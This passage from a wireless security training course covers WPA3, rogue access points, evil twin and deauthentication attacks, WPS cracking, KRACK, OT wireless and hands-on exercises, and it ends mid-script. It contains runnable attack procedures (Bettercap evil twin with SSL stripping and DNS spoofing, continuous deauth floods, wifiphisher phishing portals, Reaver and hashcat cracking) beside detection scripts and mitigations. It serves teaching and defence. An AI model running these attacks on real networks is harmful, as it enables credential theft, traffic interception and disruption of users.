WPA3 Transition Mode:
  AP broadcasts support for both WPA3-SAE and WPA2-PSK
  WPA3 clients: use SAE → strong
  WPA2 clients: use PSK → potentially vulnerable
  
Downgrade Attack:
  Attacker broadcasts rogue AP with same SSID announcing WPA2 only
  WPA3-capable client may downgrade to WPA2 to connect
  WPA2 connection → vulnerable to PMKID/handshake capture
  
Dragonblood Vulnerabilities (Mathy Vanhoef, 2019):
  Side-channel attacks against SAE implementation:
  
  CVE-2019-9494 (Cache Side-Channel):
    WPA3's SAE implementation used non-constant-time operations
    Cache access patterns revealed information about the password
    Allowed offline dictionary attack on some implementations
    
  CVE-2019-9496 (Confirm Forgery):
    SAE confirm frame could be forged to bypass authentication in some implementations
    
  CVE-2019-13377 (Side-Channel, Brainpool Curves):
    New attack path via timing differences
    
  All patched in subsequent WPA3 implementations
  Lesson: even new standards have implementation vulnerabilities
```

```bash
# Check WPA3 support:
sudo airodump-ng wlan0mon | grep -E "WPA3|SAE"
sudo iw dev wlan0 scan | grep -E "SAE|WPA3|OWE"

# OWE — Opportunistic Wireless Encryption (WPA3 feature):
# Open networks (coffee shops, hotels) typically have NO encryption
# OWE provides encryption without authentication (no password)
# Each client gets unique encryption key via DH
# Prevents passive eavesdropping on open networks (but not MITM)
sudo iw dev wlan0 scan | grep "OWE"

# Test SAE vs PSK connection:
# Check wpa_supplicant configuration:
cat /etc/wpa_supplicant/wpa_supplicant.conf
# key_mgmt=SAE  → WPA3
# key_mgmt=WPA-PSK  → WPA2
# key_mgmt=SAE WPA-PSK  → Transition mode
```

> **Key Insight:** WPA3's SAE eliminates offline dictionary attacks — the primary attack against WPA2-PSK. However, WPA3 Transition Mode (running WPA2 and WPA3 simultaneously) reintroduces downgrade attack risk. Networks that must support legacy WPA2 clients cannot fully benefit from WPA3's protection. The complete solution requires WPA3-only networks for sensitive environments, accepting that legacy devices will not connect.

---

## 8. Rogue Access Point

### 8.1 What Is a Rogue Access Point

A rogue access point (rogue AP) is any wireless access point connected to a network without authorisation. The term covers:

1. **Malicious Rogue:** Deliberately installed by an attacker to gain network access
2. **Accidental Rogue:** Employee plugs in home router to get better WiFi — unintentionally creates security vulnerability
3. **Misconfigured Rogue:** AP configured incorrectly (wrong VLAN, wrong security settings)

```
Rogue AP Attack Scenarios:

Scenario 1: Physical Access + Rogue AP Deployment
  Attacker enters building (social engineering, tailgating)
  Plugs rogue AP into Ethernet port
  Rogue AP connects to corporate network
  Attacker controls rogue AP remotely via internet or cellular
  Has persistent LAN access without maintaining physical presence

Scenario 2: Rogue AP for Wireless Eavesdropping
  Rogue AP placed near sensitive area
  Configured to capture all wireless traffic
  Passive monitoring of unencrypted wireless devices
  
Scenario 3: Accidental Rogue by Employee
  Employee frustrated with weak WiFi signal
  Brings personal router from home
  Plugs into corporate Ethernet
  Router broadcasts open SSID "HomeNetwork"
  Corporate network now accessible without authentication from parking lot
  
Scenario 4: OT Environment Rogue
  Vendor technician needs wireless access for laptop
  Connects a portable WiFi router to OT network port "just for the service visit"
  Forgets to remove it
  OT network now has undocumented wireless access point
  May remain undiscovered for months or years
```

### 8.2 Setting Up a Rogue AP

```bash
# Creating a rogue AP on Linux (educational — authorised testing only):

# Required: wireless adapter capable of AP mode
iw list | grep "AP"                  # Check if adapter supports AP mode

# Method 1: hostapd (most flexible)
cat > /tmp/rogue_ap.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=CorpWiFi                        # Same SSID as target network
hw_mode=g                            # 802.11g (2.4 GHz)
channel=6
macaddr_acl=0                        # Accept all MACs
ignore_broadcast_ssid=0              # Broadcast SSID
auth_algs=1                          # Open authentication
wpa=2                                # Enable WPA2
wpa_passphrase=Password123           # WPA2 password (for legitimate rogue)
wpa_key_mgmt=WPA-PSK
rsn_pairwise=CCMP
EOF

sudo hostapd /tmp/rogue_ap.conf

# Add DHCP server for connecting clients:
sudo apt install dnsmasq
cat > /tmp/dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=192.168.99.2,192.168.99.254,12h
dhcp-option=3,192.168.99.1          # Gateway
dhcp-option=6,8.8.8.8,8.8.4.4     # DNS
EOF

sudo ip addr add 192.168.99.1/24 dev wlan0
sudo dnsmasq -C /tmp/dnsmasq.conf

# Enable routing (if connecting clients to internet):
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Method 2: create_ap (wrapper tool, simpler):
sudo apt install create_ap
sudo create_ap wlan0 eth0 "CorpWiFi" "Password123"
# wlan0: wireless interface for AP
# eth0: interface to share internet from
# "CorpWiFi": SSID
# "Password123": password
```

### 8.3 Rogue AP Detection

```bash
# WIDS (Wireless Intrusion Detection System) approach:
# Monitor all APs and compare against authorised AP list

# Manual detection with airodump-ng:
sudo airodump-ng wlan0mon > /tmp/ap_survey.txt

# Python-based rogue detection:
cat > /tmp/detect_rogue.py << 'EOF'
#!/usr/bin/env python3
"""
Rogue AP Detector — compares seen APs against authorised list
"""
import subprocess, re

# Authorised APs: (ESSID, BSSID) pairs
AUTHORISED = {
    ("CorpWiFi", "AA:BB:CC:DD:EE:FF"),
    ("CorpWiFi", "AA:BB:CC:DD:EE:10"),  # Second AP, same SSID
    ("CorpGuest", "AA:BB:CC:DD:EE:20"),
}

CORPORATE_SSIDS = {"CorpWiFi", "CorpGuest", "CorpIoT"}

# Scan for APs (simplified — in production, use continuous monitoring)
result = subprocess.run(
    ["sudo", "iw", "dev", "wlan0", "scan"],
    capture_output=True, text=True
)

current_ap = {}
for line in result.stdout.split('\n'):
    if 'BSS ' in line:
        if current_ap and current_ap.get('SSID'):
            ap = (current_ap['SSID'], current_ap['BSSID'])
            
            # Check if SSID matches corporate but BSSID not authorised
            if current_ap['SSID'] in CORPORATE_SSIDS and ap not in AUTHORISED:
                print(f"[ALERT] ROGUE AP DETECTED:")
                print(f"  SSID: {current_ap['SSID']}")
                print(f"  BSSID: {current_ap['BSSID']}")
                print(f"  Signal: {current_ap.get('signal', 'unknown')}")
                
        match = re.search(r'BSS ([0-9a-f:]{17})', line)
        current_ap = {'BSSID': match.group(1) if match else 'unknown'}
        
    elif 'SSID: ' in line:
        current_ap['SSID'] = line.strip().replace('SSID: ', '')
    elif 'signal: ' in line:
        current_ap['signal'] = line.strip()

EOF
sudo python3 /tmp/detect_rogue.py

# Enterprise WIDS tools:
# Cisco Adaptive Wireless IPS (aWIPS) — built into Cisco infrastructure
# Aruba RFProtect — built into Aruba APs
# Zebra AirDefense — dedicated WIDS
# Kismet — open source passive WIDS
# Snort wireless rules — detect injection and rogue APs
```

**802.1X as Rogue AP Prevention:**

```
Problem: Employee plugs rogue AP into network port
Solution: 802.1X port authentication on switches

Without 802.1X:
  Employee plugs rogue AP in → gets DHCP → has network access
  
With 802.1X:
  Employee plugs rogue AP in → switch port in unauthenticated state
  Rogue AP cannot authenticate (no 802.1X supplicant configured)
  Switch keeps port blocked → rogue AP has no network access
  
Limitation:
  If rogue AP's uplink port is configured as trunk/bypass:
  802.1X may not apply to all traffic
  Bridge mode rogue AP may pass 802.1X frames through
```

> **Key Insight:** The most dangerous rogue access points are the ones never detected — accidentally deployed by well-meaning employees who just wanted better WiFi. 802.1X on all switch ports, combined with continuous wireless monitoring, is the only reliable defence. Every unmonitored Ethernet port in a building is a potential rogue AP deployment point. In OT environments, an undiscovered rogue AP can persist for years — the average OT security incident has a 6+ month dwell time.

---

## 9. Evil Twin Attack

### 9.1 Evil Twin Architecture

An evil twin attack creates a near-identical copy of a legitimate wireless network, with the attacker positioned between clients and the real network (or internet). Unlike a simple rogue AP, an evil twin specifically targets clients of a known network.

```
LEGITIMATE NETWORK:
  Client → [Corporate AP] → Corporate Network

EVIL TWIN ATTACK:
  Client → [Evil Twin AP] → Attacker → [Internet or Corporate Network]
                                ↑
                        Man-in-the-Middle:
                        Can read, modify, inject traffic
                        SSL strip, credential capture,
                        malware injection, traffic recording

Evil Twin Properties:
  Same SSID as legitimate network
  BSSID: spoofed to match legitimate AP (or different — doesn't matter for auto-connect)
  Signal: typically stronger than legitimate AP (attacker close to client)
  Security: same (WPA2 with same SSID) or open (for credential capture)
  DHCP: provides addresses, positions attacker as default gateway
  DNS: serves controlled DNS (enables phishing, content injection)
```

### 9.2 Evil Twin Attack — Complete Implementation

```bash
# Evil Twin with Bettercap (modern, comprehensive):

# Step 1: Set up monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# Step 2: Identify target network
sudo airodump-ng wlan0mon
# Note SSID, BSSID, channel, security type

# Step 3: Run Bettercap evil twin:
sudo bettercap -iface wlan0mon

# In Bettercap console:
# wifi.recon on                    # Start scanning
# wifi.show                        # Show discovered networks
# set wifi.ap.ssid "CorpWiFi"     # Set evil twin SSID
# set wifi.ap.bssid aa:bb:cc:dd:ee:ff  # Spoof legitimate AP's BSSID
# set wifi.ap.channel 6           # Same channel as legitimate AP
# wifi.ap on                      # Start evil twin AP
# set arp.spoof.targets 192.168.0.0/24
# arp.spoof on                    # MITM connected clients
# net.sniff on                    # Capture traffic

# Step 4: Force clients off legitimate AP:
# (While evil twin is running)
sudo aireplay-ng --deauth 0 -a LEGITIMATE_AP_BSSID wlan0mon
# Continuous deauth → clients constantly disconnected from legitimate AP
# Clients scan for known network → find evil twin (stronger signal, same SSID)
# Clients connect to evil twin

# Step 5: Capture credentials from connected clients:

# HTTP credentials — plaintext:
sudo bettercap -iface wlan0
# net.sniff on
# Captures all HTTP forms with credentials

# SSL Strip — downgrade HTTPS to HTTP:
# set https.proxy.sslstrip true
# https.proxy on
# (Note: HSTS-preloaded sites resist SSL strip)

# DNS spoofing — redirect to phishing pages:
cat > /tmp/dns_spoof.yml << 'EOF'
- host: "corporate-sso.company.com"
  address: "192.168.99.1"         # Attacker's IP running fake login
EOF
# set dns.spoof.hosts /tmp/dns_spoof.yml
# dns.spoof on

# With FluxionFramework (comprehensive evil twin attack tool):
sudo apt install fluxion 2>/dev/null || \
    git clone https://github.com/FluxionNetwork/fluxion.git /opt/fluxion
# cd /opt/fluxion && sudo ./fluxion.sh
# Provides: AP selection, deauth, captive portal for credential capture
```

### 9.3 WPA2 Credential Capture via Evil Twin

A specific, highly effective variant captures WPA2 handshakes through the evil twin and tricks users into entering the real password via a captive portal.

```
WPA2 Evil Twin Attack Flow:

1. Attacker captures WPA2 4-way handshake from legitimate AP
2. Evil twin AP set up on different channel, deauth attacks legitimate AP
3. Client connects to evil twin (same SSID)
4. Evil twin shows captive portal: "Your session expired. Enter WiFi password to continue."
5. User enters real password (it's the normal login page, it looks real)
6. Attacker tests entered password against captured handshake
7. If match: password confirmed and obtained
8. Evil twin shows "reconnecting..." while dropping client back to legitimate network
9. User believes it was a normal reconnection

Tools: Fluxion, wifiphisher
```

```bash
# Wifiphisher — automated evil twin with social engineering:
sudo apt install wifiphisher 2>/dev/null || \
    git clone https://github.com/wifiphisher/wifiphisher.git /opt/wifiphisher

sudo python3 /opt/wifiphisher/bin/wifiphisher \
    -aI wlan0 \                     # Interface for evil twin
    -jI wlan1 \                     # Interface for jamming/deauth
    -p firmware-upgrade \           # Phishing scenario (firmware upgrade page)
    --essid "CorpWiFi"             # Target SSID

# Phishing scenarios available in wifiphisher:
# firmware-upgrade: "Router firmware is updating, enter WiFi password"
# oauth-login: Fake OAuth screen for Google/Facebook login
# wifi_connect: "Enter WiFi password to continue"
# browser_plugin_update: Fake browser plugin update

# Detection of evil twin attacks:
# 1. Multiple APs with same SSID on different channels (legitimate = one channel)
# 2. AP with same SSID but different BSSID from authorised list
# 3. Client deauthentications without legitimate reason
# 4. DNS queries being answered by unexpected IPs
# 5. Certificate warnings on normally HTTPS-only sites (SSL stripping)
```

### 9.4 Evil Twin Detection and Mitigation

```bash
# Client-side detection:
# Check for unexpected SSL certificate changes:
# Expected: cert from company CA
# Evil twin SSL strip: no cert (HTTP)
# Evil twin with fake cert: different CA, invalid cert

# Enterprise WIDS detection:
# - Multiple APs advertising same SSID on same channel (normal = one)
# - SSID appears on unauthorised BSSID
# - Deauthentication flood from non-AP addresses
# - Client associations changing rapidly between similar BSSIDs

# Monitor for evil twin with airodump-ng:
sudo airodump-ng wlan0mon > /tmp/survey.txt
# Look for same SSID appearing with different BSSID or on wrong channel

# Corporate mitigation:
# 1. 802.1X enterprise authentication:
#    Evil twin cannot replicate RADIUS — clients see certificate error → don't connect
# 2. Certificate pinning in corporate apps:
#    Apps reject connections through MITM even if SSID/credentials are valid
# 3. VPN kill switch:
#    All traffic through corporate VPN → evil twin MITM only sees VPN traffic
# 4. HSTS preloading:
#    Browsers never downgrade HTTPS for preloaded domains → SSL strip fails
# 5. Wireless IDS with automated alerts
```

> **Key Insight:** The evil twin attack exploits the fact that clients auto-connect to known SSIDs without verifying AP identity. WPA2-PSK provides no protection — the evil twin knows the password (it was cracked or socially engineered). WPA2-Enterprise with server certificate validation is the defence: the fake RADIUS in an evil twin cannot present a valid certificate for your organisation's RADIUS server. VPN with kill switch is the ultimate mitigation: even if a client connects to an evil twin, all traffic is encrypted in the VPN tunnel.

---

## 10. Additional Critical Wireless Attacks

### 10.1 Deauthentication and Disassociation Attacks

```
IEEE 802.11 Management Frames:
  Deauthentication (type 0x00, subtype 0x0C):
    Terminates an authenticated session
    Can be sent by: AP to disconnect client, client to disconnect from AP
    Unauthenticated: any device can forge a deauth frame as any sender
    
  Disassociation (type 0x00, subtype 0x0A):
    Terminates an associated session (less complete than deauth)
    Also unauthenticated
    
Attack: Forged Deauthentication
  Attacker sends deauth frames with AP's BSSID as source, targeting specific client
  Client receives "AP told me to disconnect" → disconnects
  Client attempts reconnection → handshake capture opportunity
  OR: continuous deauth → DoS against specific client or all clients
  
IEEE 802.11w (Management Frame Protection):
  Adds cryptographic authentication to management frames
  Deauth frames MIC-authenticated → forged deauths rejected
  Requirement: WPA3 requires 802.11w
  WPA2 with 802.11w: called "Protected Management Frames" (PMF)
  Status: 2019+ Wi-Fi Alliance requires PMF support, WPA3 mandates it
```

```bash
# Deauthentication attack:
sudo aireplay-ng \
    --deauth 100 \                  # Number of deauth packets (0 = infinite)
    -a AA:BB:CC:DD:EE:FF \         # Target AP BSSID
    -c 11:22:33:44:55:66 \         # Target client (omit for broadcast deauth)
    wlan0mon

# Detect 802.11w capability (PMF):
sudo iw dev wlan0 scan | grep -A5 "BSS" | grep -i "protected"
# or in airodump: check CIPHER column for CCMP with 802.11w support

# Verify your network has PMF enabled:
sudo iw dev wlan0 info
# And check hostapd config: ieee80211w=2 (required) or ieee80211w=1 (capable)
```

### 10.2 WPS — Wi-Fi Protected Setup Attacks

```
WPS (Wi-Fi Protected Setup):
  Designed to simplify device connection to Wi-Fi
  Methods:
    PBC (Push Button): Press button on router, device connects automatically
    PIN: 8-digit PIN for authentication
    NFC: Near-field communication (rare)
    
WPS PIN Vulnerability (2011):
  8-digit PIN: 10^8 = 100,000,000 possible values (100M guesses worst case)
  But: AP validates PIN in two halves (first 4 digits, last 4 digits)
  First half: 10^4 = 10,000 guesses
  Second half: 10^3 = 1,000 guesses (last digit is checksum)
  Total: 11,000 guesses maximum → cracked in 2-10 hours
  
Pixie Dust Attack (2014, Dominique Bongard):
  WPS implementation bug: predictable random numbers used in DH exchange
  AP's random nonces are predictable from public values
  Full WPS PIN recovered offline from single exchange — seconds to minutes
  Affects: many Broadcom and Ralink chipset routers
```

```bash
# WPS attack with Reaver:
# Step 1: Find WPS-enabled APs:
sudo wash -i wlan0mon              # Identifies WPS-enabled APs
# Note: BSSID, ESSID, WPS Version, WPS Locked status

# Step 2: Pixie Dust attack (fast, offline):
sudo reaver \
    -i wlan0mon \                  # Monitor mode interface
    -b AA:BB:CC:DD:EE:FF \        # Target AP BSSID
    -vv \                          # Verbose output
    -K 1 \                         # Pixie Dust mode
    -c 6                           # Channel

# Step 3: If Pixie Dust fails, brute force PIN:
sudo reaver \
    -i wlan0mon \
    -b AA:BB:CC:DD:EE:FF \
    -vv \
    -c 6 \
    -d 2 \                         # Delay between attempts (avoid lockout)
    -r 3:60                        # Rate limit: 3 attempts per 60 seconds

# WPS lockout: many APs lock WPS after ~10 failures
# Bully is an alternative to Reaver: sudo apt install bully

# Defence: Disable WPS entirely on all access points
# Router admin → Wireless → WPS → Disable
# Even with WPS "disabled", some firmware still responds to WPS probes
# Verify with: sudo wash -i wlan0mon (should not show WPS on secured AP)
```

### 10.3 KRACK — Key Reinstallation Attack (2017)

```
CVE-2017-13077 through CVE-2017-13086
Discovered by: Mathy Vanhoef
Severity: All WPA2 implementations

How KRACK Works:
  WPA2 4-way handshake — Message 3 (AP → Client):
    Contains GTK (Group Temporal Key)
    AP may retransmit if no ACK received
    Each retransmission uses same ANonce
    
  Attack:
    Attacker intercepts Message 3
    Prevents Client from acknowledging → AP retransmits Message 3
    Attacker can replay Message 3 multiple times
    
  Key Reinstallation:
    Receiving Message 3 again causes client to reinstall PTK with same key
    Nonce (counter) reset to initial value
    
  Nonce Reuse + AES-CCMP:
    AES-CCMP nonce is the packet counter
    Nonce reuse allows keystream recovery (similar to WEP)
    → Attacker can decrypt traffic
    
Impact by platform:
  Linux/Android: Used all-zeros key after reinstallation (catastrophic)
  Windows/iOS: Partial vulnerability (limited practical impact)
  
KRACK was patched in OS updates (2017-2018)
Legacy unpatched devices remain vulnerable (OT concern)
```

### 10.4 Bluetooth Security — Brief Overview

Bluetooth uses the 2.4 GHz ISM band, shares spectrum with Wi-Fi, and has its own security architecture relevant to OT/ICS.

```
Bluetooth Attack Surface:
  BlueBorne (2017, Armis Research):
    Remote code execution via Bluetooth WITHOUT PAIRING
    Attacker in range → exploit → RCE as highest privilege
    Affected: Linux, Android, Windows, iOS (before patch)
    ~5.3 billion devices affected at disclosure
    
  Bluesnarfing:
    Unauthorised access to Bluetooth device data
    Contact list, messages, calendar without pairing
    
  Bluejacking:
    Send unsolicited messages to Bluetooth devices
    Social engineering vector
    
  Eavesdropping:
    Capture Bluetooth traffic with custom hardware
    Ubertooth One: open-source Bluetooth monitor
    Most Bluetooth uses frequency hopping (1600 hops/second)
    Monitoring requires hardware that can follow hops

OT Relevance:
  Bluetooth used for:
    Field device configuration (handheld terminals for HART, PROFIBUS)
    Wireless sensors (industrial IoT)
    Worker safety devices (fall detection, gas detection)
  
  Security concern: Bluetooth field configuration tool paired to PLC
  Attacker with BlueBorne exploit → RCE on configuration tool →
  access to PLC programming interface
```

---

## 11. Wireless Forensics and Detection

### 11.1 Wireless Evidence Collection

```bash
# Comprehensive wireless monitoring setup:

# 1. Enable monitor mode:
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# Result: wlan0mon

# 2. Full packet capture (all channels, all traffic):
sudo airodump-ng \
    -w /tmp/wireless_evidence \     # Output prefix (creates .cap, .csv, .kismet.netxml)
    --output-format pcap,csv,netxml \  # Multiple output formats
    wlan0mon                         # Monitor interface

# 3. Targeted capture (specific AP):
sudo airodump-ng \
    --bssid AA:BB:CC:DD:EE:FF \     # Target AP
    --channel 6 \
    --manufacturer \                  # Show manufacturer info
    -w /tmp/target_capture \
    wlan0mon

# 4. Kismet for comprehensive WIDS/forensics:
sudo apt install kismet
sudo kismet -c wlan0mon \
    --log-title="Wireless Survey" \
    --log-types=kismet,pcapng,csv

# 5. GPS correlation (wardriving):
sudo kismet -c wlan0mon \
    --use-gpsd                       # Connect to GPSD for location data

# Extract useful data from capture:
# All unique BSSIDs:
tshark -r capture.pcap -T fields -e wlan.bssid | sort -u | grep -v "^$"

# All unique SSIDs:
tshark -r capture.pcap -T fields -e wlan.ssid | sort -u | grep -v "^$"

# Probe requests (what networks are clients looking for):
tshark -r capture.pcap -Y "wlan.fc.type_subtype == 4" \
    -T fields -e wlan.ta -e wlan.ssid

# Authentication frames (track connection events):
tshark -r capture.pcap -Y "wlan.fc.type_subtype == 11 or wlan.fc.type_subtype == 0"
```

### 11.2 Forensic Analysis of Captured Traffic

```bash
# Decrypt WPA2 traffic in Wireshark (if password known):
# Edit → Preferences → Protocols → IEEE 802.11
# Enable: "Enable decryption"
# Add: Decryption key — "wpa-pwd" type, "Password:SSID" format
# Example: "MyPassword123:CorpWiFi"

# Command line decryption with airdecap-ng:
airdecap-ng \
    -p "MyPassword123" \             # WPA2 password
    -e "CorpWiFi" \                  # SSID
    capture.cap                      # Input capture

# Decrypt WEP traffic:
airdecap-ng \
    -w 1A2B3C4D5E \                 # WEP key in hex
    capture.cap

# Extract HTTP credentials from decrypted capture:
tshark -r decrypted.cap \
    -Y "http.request.method == POST" \
    -T fields -e http.request.uri -e http.file_data

# Find all passwords in capture:
strings capture.cap | grep -E "password|passwd|pwd|pass" -i | head -20

# Analyse timeline of wireless events:
tshark -r capture.cap -T fields \
    -e frame.time \
    -e wlan.fc.type_subtype \
    -e wlan.sa \
    -e wlan.da \
    -Y "wlan.fc.type == 0" |        # Management frames only
    sort
```

---

## 12. Wireless in OT/ICS Environments

### 12.1 Industrial Wireless Technologies

Industrial wireless is fundamentally different from enterprise Wi-Fi in its requirements and therefore its security profile:

```
Industrial Wireless Technologies:

IEEE 802.11 (Standard Wi-Fi):
  Use: Engineering workstations, HMI tablets, operator interface
  Security: Should use WPA2-Enterprise or WPA3
  Risk: Same as enterprise wireless, plus physical security gaps
  
WirelessHART (IEC 62591):
  Purpose: Wireless sensor measurements (process variables: pressure, temperature, flow)
  Frequency: 2.4 GHz, IEEE 802.15.4 DSSS
  Topology: Mesh network, self-healing
  Security: AES-128 encryption, device authentication via join keys
  Range: 50-200m per hop, mesh extends to kilometre scale
  OT use: Field sensor data without wiring (common in oil/gas, chemical)
  
ISA100.11a (IEC 62734):
  Purpose: Similar to WirelessHART — industrial sensor networking
  Frequency: 2.4 GHz
  Security: AES-128, PKI-based device certificates
  
Zigbee (IEEE 802.15.4):
  Purpose: Building automation, smart energy, industrial monitoring
  Frequency: 2.4 GHz (also 868/915 MHz)
  Topology: Star, tree, mesh
  Security: AES-128 (but poor key management in many deployments)
  Range: 10-100m
  
PROFIBUS Wireless (proprietary):
  Some vendors offer wireless extensions to PROFIBUS
  Typically 2.4 or 5 GHz
  Security: varies by vendor, often minimal
  
Bluetooth (IEEE 802.15.1):
  Use: Field device configuration (HART, PROFIBUS parameter setting)
  Range: typically <10m for Class 2
  Security: pairing-based (vulnerable to BlueBorne if unpatched)
```

### 12.2 OT Wireless Security Challenges

```
Challenge 1: Air-Gap Expectation vs Reality
  Many OT networks are assumed to be air-gapped (no wireless)
  Reality: wireless is often present:
    - Engineering workstations connected to corporate WiFi
    - Vendor-installed wireless for remote monitoring
    - Employee hotspots
    - Wireless sensors added "temporarily"
  
  Assessment action: Always scan for wireless in OT environments
  Even "air-gapped" environments should be surveyed
  
Challenge 2: Legacy Protocol Security
  WirelessHART: AES-128 correctly implemented — acceptable
  Zigbee: AES-128 but key management often broken:
    Default install keys well-known
    Key transport often in cleartext
    Many deployments use same global link key across all devices
    
Challenge 3: Update-Resistant Hardware
  Industrial wireless gateways and access points:
    Long lifecycles (10-20 years)
    Vendor must validate firmware before deployment
    Emergency patches rare
    Known vulnerabilities may remain unpatched for years
    
Challenge 4: Physical Exposure
  Field sensors in remote locations
  Wireless gateway in unsecured enclosures
  Physical access → firmware extraction, configuration modification
  
Challenge 5: Channel Interference
  Industrial equipment generates RF interference (motor drives, welders)
  Interference patterns can affect wireless reliability
  Attackers can use interference as DoS against wireless sensors
```

### 12.3 OT Wireless Security Controls

```
NERC CIP (Energy Sector) wireless requirements:
  CIP-005-6: Electronic Security Perimeter must include wireless
  Access points that connect to BES Cyber Systems must be protected
  Wireless access = electronic access point requiring controls
  
IEC 62443 wireless guidance:
  Zone and conduit model applies to wireless
  Wireless sensors in a zone: must be protected at zone boundary
  Wireless AP: acts as conduit between zones
  
Practical OT wireless controls:

1. Network Segmentation:
   OT wireless AP should NOT directly connect to process network
   OT wireless → DMZ → [Firewall] → Process Network
   Sensor data: one-way data flow from wireless network to process network
   
2. Wireless Sensor Security:
   WirelessHART: deploy with unique join keys per device (not default)
   Zigbee: use unique link keys, disable trust center link key sharing
   Rotate keys periodically
   
3. Employee WiFi:
   Separate SSID/VLAN for engineering workstations
   No direct routing to process control network
   All access through jump server in DMZ
   
4. Wireless Survey:
   Quarterly RF survey to detect rogue APs
   Survey from outside the facility (what's visible externally?)
   Document all authorised wireless assets
   
5. Physical Security:
   Wireless field devices in lockable enclosures
   Wireless APs in secured locations or in tamper-evident enclosures
   GPS tracking on mobile wireless devices
```

```bash
# OT wireless security assessment:

# 1. Survey wireless landscape (from outside building if possible):
# Long-range adapter + directional antenna:
sudo airodump-ng --band abg wlan0mon > /tmp/wireless_inventory.txt

# 2. Identify industrial wireless (2.4 GHz mesh characteristics):
# WirelessHART: looks for 802.15.4 traffic (requires SDR or specialised adapter)
# Standard 802.11 survey won't see Zigbee/WirelessHART directly

# 3. Check for OT SSIDs that shouldn't be wireless:
grep -iE "scada|plc|ot|control|historian|hmi" /tmp/wireless_inventory.txt

# 4. Check Zigbee networks (requires 802.15.4 capable hardware):
# KillerBee framework for Zigbee analysis:
# sudo apt install killerbee
# zbstumbler                      # Discover Zigbee networks
# zbdump -c 11 -w zigbee.pcap    # Capture on channel 11

# 5. Verify no OT wireless connects directly to process network:
# Check routing tables of hosts connected to OT wireless
# Verify firewall rules between wireless VLAN and process VLAN

# 6. Check for default Zigbee keys:
# Default ZigBee trust center link key:
# 5A6967426565416C6C69616E63653039 (hex)
# "ZigBeeAlliance09" (ASCII)
# If this key is in use: all traffic can be decrypted
```

---

## 13. Hands-On Exercises

### Exercise 1: Wireless Network Survey (30 minutes)

```bash
# Complete wireless environment mapping

# Setup:
sudo apt install aircrack-ng kismet wireshark -y

# Step 1: Enable monitor mode
sudo airmon-ng check kill
sudo airmon-ng start wlan0
# Note your interface name (wlan0mon or similar)

# Step 2: Full survey
sudo airodump-ng --manufacturer wlan0mon 2>/dev/null | tee /tmp/survey.txt &
sleep 30
kill %1

# Step 3: Analyse results
echo "=== Access Points Found ==="
cat /tmp/survey.txt | head -30

# Step 4: Categorise by security
echo ""
echo "=== Open Networks (no encryption) ==="
grep "OPN" /tmp/survey.txt

echo ""
echo "=== WEP Networks (broken) ==="
grep " WEP " /tmp/survey.txt

echo ""
echo "=== WPA Networks (deprecated) ==="
grep " WPA " /tmp/survey.txt | grep -v WPA2

echo ""
echo "=== WPA2 Networks ==="
grep "WPA2" /tmp/survey.txt

# Step 5: Check for WPS-enabled networks:
sudo wash -i wlan0mon 2>/dev/null &
sleep 20
kill %1
```

### Exercise 2: Wireless Password Security Test (on your own network)

```bash
# Test your own network's WPA2 password strength

# IMPORTANT: Only do this on networks you own or have explicit permission to test

# Step 1: Capture handshake from your own AP
sudo airodump-ng \
    --bssid YOUR_AP_BSSID \
    --channel YOUR_CHANNEL \
    -w /tmp/my_network \
    wlan0mon &

# Connect a device to your network (generates handshake)
sleep 30
kill %1

# Step 2: Convert to hashcat format
hcxpcapngtool -o /tmp/my_hash.hc22000 /tmp/my_network-01.cap

# Step 3: Test against common passwords
hashcat -m 22000 /tmp/my_hash.hc22000 /usr/share/wordlists/rockyou.txt \
    --quiet

# If cracked: your password is too weak
# If not cracked from rockyou: try rules:
hashcat -m 22000 /tmp/my_hash.hc22000 /usr/share/wordlists/rockyou.txt \
    -r /usr/share/hashcat/rules/best64.rule --quiet

# Recommended minimum: 20+ character random password
# or 6+ word passphrase (e.g., "correct-horse-battery-staple-wifi-2024!")

# PMKID attack (no clients needed):
hcxdumptool -i wlan0mon -o /tmp/pmkid.pcapng --enable_status=1 &
sleep 60
kill %1

hcxpcapngtool -o /tmp/pmkid_hash.hc22000 /tmp/pmkid.pcapng
hashcat -m 22000 /tmp/pmkid_hash.hc22000 /usr/share/wordlists/rockyou.txt
```

### Exercise 3: Build a Wireless Monitor System (45 minutes)

```bash
# Build a passive wireless monitoring system using Kismet

# Install Kismet:
sudo apt install kismet -y

# Configure:
sudo cat > /etc/kismet/kismet_site.conf << 'EOF'
# Monitor interface
source=wlan0

# Log settings
log_prefix=/tmp/kismet_logs
log_types=kismet,pcapng

# Alert on new APs (possible rogue):
alert=NEWAP,alert,1/sec,10/min
# Alert on probe requests (clients looking for networks):
alert=PROBEREQ,info,10/sec,100/min
EOF

# Run Kismet:
sudo kismet -c wlan0 --log-prefix /tmp/kismet

# Access Kismet web interface:
# http://localhost:2501 (default)
# Default credentials set on first run

# Generate analysis report:
python3 << 'EOF'
import json, glob

# Find Kismet JSON exports
for f in glob.glob('/tmp/kismet*.kismet'):
    try:
        with open(f) as fp:
            data = json.load(fp)
        print(f"Networks found: {len(data.get('dot11.device', []))}")
    except:
        print(f"Could not parse {f}")
        
print("\nManually review Kismet web interface for:")
print("  - All detected APs and their properties")
print("  - Client probe requests (PNL enumeration)")
print("  - Alert events (deauth, suspicious activity)")
print("  - Signal strength and location data")
EOF
```

### Exercise 4: Detect Wireless Attacks (30 minutes)

```bash
# Create detection rules for common wireless attacks

cat > /tmp/detect_wireless.py << 'EOF'
#!/usr/bin/env python3
"""
Wireless Attack Detector using Scapy
Detects: Deauth floods, Probe Request enumeration, Rogue AP indicators
"""
from scapy.all import *
from collections import defaultdict
import time

# Counters
deauth_count = defaultdict(int)
probe_requests = defaultdict(set)
seen_bssids = {}

# AUTHORISED APs — fill with your known APs
AUTHORISED_APS = {
    "AA:BB:CC:DD:EE:FF": "HomeNetwork",
    # Add your known BSSIDs
}

THRESHOLD_DEAUTH = 10    # Deauths per 10 seconds = alert
THRESHOLD_PROBES = 5     # SSIDs probed by single client = alert

def process_packet(pkt):
    current_time = time.time()
    
    # Deauthentication detection
    if pkt.haslayer(Dot11Deauth):
        src = pkt.addr2
        dst = pkt.addr1
        deauth_count[src] += 1
        
        if deauth_count[src] > THRESHOLD_DEAUTH:
